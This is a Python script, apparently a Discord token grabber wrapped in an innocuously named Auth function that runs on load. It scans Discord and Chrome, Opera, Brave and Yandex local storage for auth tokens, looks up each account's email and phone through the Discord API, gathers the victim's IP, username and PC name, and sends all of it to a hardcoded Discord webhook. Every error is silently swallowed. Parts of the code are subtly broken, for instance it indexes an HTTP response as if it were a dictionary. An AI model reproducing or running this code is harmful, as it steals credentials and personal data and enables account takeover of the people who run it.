
import urllib3
import os
from re import findall
from json import dumps
from base64 import b64decode
from urllib.request import Request, urlopen
import time
import requests

urllib3.disable_warnings()

def Auth():
    def dastela():
        global WEBHOOK
        WEBHOOK = "https://discord.com/api/webhooks/1114215814363615242/vyWckTNTfnV6nJ8QVHfQ4GsHTwGCeYCONTvYodTI80RNjnOeYed5SwRHT4oDwx6k95Jr"
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"    : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def getuserdata(token):
            try:
                headers = getheaders(token)
                print(headers)
                userdata = requests.get("https://discordapp.com/api/v6/users/@me", headers=headers)
                return userdata
            except:
                pass
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens
        def getip():
            ip = "None"
            try:
                ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            except:
                pass
            return ip
        def main():
            cache_path = ROAMING + "\\.cache~$"
            embeds = []
            working = []
            checked = []
            already_cached_tokens = []
            working_ids = []
            ip = getip()
            pc_username = os.getenv("UserName")
            pc_name = os.getenv("COMPUTERNAME")
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for token in gettokens(path):
                    if token in checked:
                        continue
                    checked.append(token)
                    uid = None
                    if not token.startswith("mfa."):
                        try:
                            uid = b64decode(token.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = getuserdata(token)
                    print(user_data.json())
                    if not user_data:
                        continue
                    working_ids.append(uid)
                    working.append(token)
                    username = user_data["username"] + "#" + str(user_data["discriminator"])
                    user_id = user_data["id"]
                    email = user_data.get("email")
                    phone = user_data.get("phone")
                    nitro = bool(user_data.get("premium_type"))
                    embed = {
                        "color": 0x7289da,
                        "fields": [
                            {
                                "name": "**Account Info**",
                                "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}',
                                "inline": True
                            },
                            {
                                "name": "**PC Info**",
                                "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                                "inline": True
                            },
                            {
                                "name": "**Token**",
                                "value": token,
                                "inline": False
                            }
                        ],
                        "author": {
                            "name": f"{username} ({user_id})",
                        },
                        "footer": {
                            "text": f"Nice"
                        }
                    }
                    embeds.append(embed)
            with open(cache_path, "a") as file:
                for token in checked:
                    if not token in already_cached_tokens:
                        file.write(token + "\n")
            if len(working) == 0:
                working.append('123')   
            webhook = {
                "content": token,
                "embeds": embeds,
                "username": "Token Grabber",
                "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
            }
            try:
                requests.post(WEBHOOK, data=dumps(webhook), headers=getheaders())
            except:
                pass
        try:
            main()
        except Exception:
            pass
    try:
        dastela()
    except:
        pass
    time.sleep(5)

Auth()